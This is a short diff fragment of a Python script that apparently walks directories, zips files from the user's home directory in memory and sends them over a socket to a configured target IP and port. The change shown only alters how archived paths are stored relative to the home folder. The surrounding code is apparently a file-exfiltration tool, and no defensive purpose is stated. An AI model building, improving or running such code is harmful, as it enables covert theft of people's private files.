@@ -57,7 +57,7 @@ def traverse_dir(path: Path):
 
 def zip_file(file: Path):
     with ZipFile(in_memory_zip, 'a') as zip:
-        zip.write(file)
+        zip.write(file, arcname=file.relative_to(Path("~/").expanduser()))
 
 def send_to_server(data):
     with socket.create_connection((target_IP, target_port)) as sock:
